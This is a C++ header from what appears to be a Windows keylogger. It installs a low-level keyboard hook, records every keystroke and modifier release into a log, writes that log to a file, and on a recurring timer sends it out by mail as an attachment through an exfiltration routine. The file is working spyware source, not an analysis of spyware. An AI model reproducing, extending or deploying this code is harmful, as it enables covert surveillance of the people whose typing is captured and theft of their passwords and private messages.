#ifndef APIHOOK_H
#define APIHOOK_H

#include <iostream>
#include <fstream>
#include <Windows.h>
#include "Keyboard.h"
#include "Timer.h"
#include "Exfiltrate.h"

namespace APIHook
{

	std::string workingKeyLog = "";

	void timerExfilLogs()
	{
		if (workingKeyLog.empty())
		{
			return;
		}

		std::string logFilePath = IO::writeToLog(workingKeyLog);

		if (logFilePath.empty())
		{
			Auxiliary::logError("File creation was unsuccessful. Keylog = [ " + workingKeyLog + " ]");
			return;
		}

		int x = Exfiltrate::exfilLogs("Log: [" + logFilePath + " ]", "Logs are in attachments!" + workingKeyLog, IO::getAppDataPath(true) + logFilePath);

		if (x != 7)
		{
			Auxiliary::logError("Mail was not sent!");
		}
		else
		{
			workingKeyLog = "";
		}
	}

	Timer mailTimer(timerExfilLogs, 500 * 60, Timer::Infinite);

	HHOOK eHook = NULL;

	LRESULT keyboardProc(int nCode, WPARAM wparam, LPARAM lparam)
	{
		if (nCode < 0)
		{
			CallNextHookEx(eHook, nCode, wparam, lparam);
		}

		KBDLLHOOKSTRUCT* kbs = (KBDLLHOOKSTRUCT*)lparam;
		if (wparam == WM_KEYDOWN || wparam == WM_SYSKEYDOWN)
		{
			workingKeyLog += KeyMap::KeyLookupEN[kbs->vkCode].humanReadableName;

			//Enter key handling

			if (kbs->vkCode == VK_RETURN)
			{
				workingKeyLog += '\n';
			}
		}
		else if (wparam == WM_KEYUP || wparam == WM_SYSKEYUP)
		{
			DWORD key = kbs->vkCode;
			if (key == VK_CONTROL ||
				key == VK_LCONTROL ||
				key == VK_RCONTROL ||
				key == VK_SHIFT ||
				key == VK_RSHIFT ||
				key == VK_LSHIFT ||
				key == VK_MENU ||
				key == VK_LMENU ||
				key == VK_RMENU ||
				key == VK_CAPITAL ||
				key == VK_NUMLOCK ||
				key == VK_LWIN ||
				key == VK_RWIN)
			{
				std::string keyName = KeyMap::KeyLookupEN[kbs->vkCode].humanReadableName;

				//When special key comes back up [/SHIFT]

				keyName.insert(1, "/");
				workingKeyLog += keyName;
			}
		}

		return CallNextHookEx(eHook, nCode, wparam, lparam);
	}

	bool installHook()
	{
		Auxiliary::logError("Hook started, timer created...!");
		mailTimer.Start(true);

		eHook = SetWindowsHookEx(WH_KEYBOARD_LL, (HOOKPROC)keyboardProc, GetModuleHandle(NULL), 0);

		return eHook == NULL;
	}

	bool uninstallHook()
	{
		BOOL b = UnhookWindowsHookEx(eHook);
		eHook = NULL;
		return (bool)b;
	}

	bool isHooked()
	{
		return (bool)(eHook == NULL);
	}

}
#endif // !APIHOOK_H
